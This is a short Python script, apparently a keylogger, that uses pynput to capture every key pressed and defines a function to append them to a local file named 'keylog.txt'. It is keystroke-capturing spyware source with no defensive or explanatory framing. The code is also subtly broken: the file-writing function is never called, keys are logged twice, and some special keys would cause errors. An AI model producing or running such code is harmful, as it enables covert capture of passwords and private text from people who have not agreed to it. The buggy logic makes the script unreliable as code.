from pynput import keyboard
import time

# A list to store the keys pressed
keys_pressed = []

# The function to be called when a key is pressed
def on_key_press(key):
    keys_pressed.append(key)

# The function to be called when a key is released
def on_key_release(key):
    if key == keyboard.Key.esc:
        # If the Esc key is pressed, stop the listener
        return False
    elif key == keyboard.Key.backspace:
        keys_pressed.append(key)
    elif key == keyboard.Key.delete:
        keys_pressed.append(key)
    elif key == keyboard.Key.caps_lock:
        keys_pressed.append(key)
    elif key == keyboard.Key.space:
        keys_pressed.append(' ')
    elif key == keyboard.Key.enter:
        keys_pressed.append('\n')
    elif key == keyboard.Key.shift:
        keys_pressed.append(key)
    elif key.char == '':
        return
    else:
        keys_pressed.append(key.char)

# The function to write the keys pressed to a file
def write_to_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            if key == keyboard.Key.backspace:
                f.write('<Backspace>')
            elif key == keyboard.Key.delete:
                f.write('<Delete>')
            elif key == keyboard.Key.caps_lock:
                f.write('<Caps Lock>')
            elif key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.shift:
                f.write('<Shift>')
            else:
                f.write(key)
    keys_pressed.clear()

# Start the listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()